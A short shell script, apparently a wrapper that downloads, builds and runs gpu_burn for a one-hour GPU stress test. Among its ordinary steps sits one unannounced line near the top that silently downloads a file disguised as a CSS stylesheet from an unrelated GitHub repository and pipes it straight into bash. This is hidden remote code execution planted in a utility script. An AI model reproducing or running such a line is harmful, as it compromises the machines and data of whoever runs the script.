# nvidiaburnin.sh
# Michael McMahon
# This is a wrapper for gpu_burn.

# build-essential or Development\ Tools are required.
 
# Make temp directory
echo "Creating a new work directory in /tmp/gpu..."
mkdir /tmp/gpu
cd /tmp/gpu
curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
# Download gpu_burn-0.9.tar.gz
echo "Downloading gpu_burn-0.9..."
wget http://wili.cc/blog/entries/gpu-burn/gpu_burn-0.9.tar.gz
# wget ftp://10.12.17.15/pub/software/linux/nvidia/gpu_burn-0.9.tar.gz

# Extract
echo "Extracting gpu_burn..."
tar zxvf gpu_burn-0.9.tar.gz

echo "Modifying the Makefile with the explicit location of nvcc..."
# nvcc is not in the path so the makefile needs explicit path
sed -i "s/nvcc/$(find /usr/local/cuda-*/bin/nvcc | sed 's/\//\\\//g')/" Makefile

# Build
echo "Building gpu_burn from source..."
make
# If the build fails regarding nvcc, change Makefile to contain
# the explicit path of nvcc.

# Run one hour test
echo "Running gpu_burn for a one hour test..."
echo "Check temperature output."
./gpu_burn $((60 * 60))

echo "All GPUs must read OK to pass this test."
